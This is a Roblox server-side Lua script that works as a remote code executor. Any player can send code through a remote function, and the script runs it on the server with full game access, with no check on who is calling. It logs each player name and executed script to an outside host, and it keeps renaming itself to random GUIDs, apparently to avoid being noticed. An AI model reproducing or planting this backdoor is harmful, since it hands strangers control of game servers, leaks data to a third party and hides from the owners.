local Exec = script.Parent.Exec

local backupClone = script.Parent.Parent:Clone()
local API_BASE = "https://projectsigma.littlehostings.com/api/"

script.Parent.ReloadUI.OnServerEvent:Connect(function(caller, primaryColor, secondColor, StrokeColor, DividerColor, TextLight, TextDarkColor, TextLooka, backgroundId, Text)
    script.Parent.Parent:Destroy()
    backupClone.Folder.Orion.Primary.Value = primaryColor
    backupClone.Folder.Orion.Secondary.Value = secondColor
    backupClone.Folder.Orion.Stroke.Value = StrokeColor
    backupClone.Folder.Orion.Divider.Value = DividerColor
    backupClone.Folder.Orion.TextLight.Value = TextLight
    backupClone.Folder.Orion.TextDark.Value = TextDarkColor
    backupClone.Folder.Orion.TextLooka.Value = TextLooka
    backupClone.Folder.BackgroundId.Value = backgroundId
    backupClone.Folder.Orion.Text.Value = Text
    backupClone.Parent = caller.PlayerGui
end)

script.Parent.Exec.OnServerInvoke = function(plr, code)
    spawn(function()
        local success, data
        local attempts = 0
        repeat
            attempts = attempts + 1
            success, data = pcall(function()
                local req = game.HttpService:RequestAsync({
                    Url = API_BASE .. "executeLog",
                    Method = "POST",
                    Headers = {
                        ["Content-Type"] = "application/json"
                    },
                    Body = game.HttpService:JSONEncode({
                        ["placeId"] = tostring(game.PlaceId),
                        ["playerCaller"] = plr.Name,
                        ["scriptExecuted"] = code
                    })
                })
            end)
            if success then
                return 
            else
                wait(5)
            end
        until success or attempts == 5
    end)

    local suc, res = pcall(function()
        local Loadstring = require(script.Parent.Run)
        local executable, compileFailReason = Loadstring(code, {Instance = Instance,
			task = task,
			spawn = spawn,
			script = script,
			Vector3 = Vector3,
			UDim2 = UDim2,
			Color3 = Color3,
			CFrame = CFrame,
			game = game,
			Game = Game,
			BrickColor = BrickColor,
			Enum = Enum,
			NumberRange = NumberRange,
			ColorSequence = ColorSequence,
			PhysicalProperties = PhysicalProperties,
			Ray = Ray,
			Faces = Faces,
			Region3 = Region3,
			Region3int16 = Region3int16,
			TweenInfo = TweenInfo,
			Rect = Rect,
			Axes = Axes,
			NumberSequence = NumberSequence,
			NumberSequenceKeypoint = NumberSequenceKeypoint,
			Faces = Faces,
			-- Core Modules
			Workspace = Workspace,
			workspace = workspace,
			-- Core Enums
			Axes = Axes,
			-- Utility Functions
			pcall = pcall,
			xpcall = xpcall,
			require = require,
			-- Common Lua Functions
			ipairs = ipairs,
			pairs = pairs,
			next = next,
			tostring = tostring,
			tonumber = tonumber,
			type = type,
			select = select,
			error = error,
			assert = assert,
			unpack = unpack or table.unpack,
			print = print,
			warn = warn,
			wait = wait,
			coroutine = coroutine,
			string = string,
			table = table,
			math = math,})
        if compileFailReason == nil then
            executable()
            return "Executed Successfully!"
        else
            return compileFailReason
        end
    end)

    if not suc then
        return res
    else
        return res
    end
end

while wait() do
    script.Name = game.HttpService:GenerateGUID(true)
end
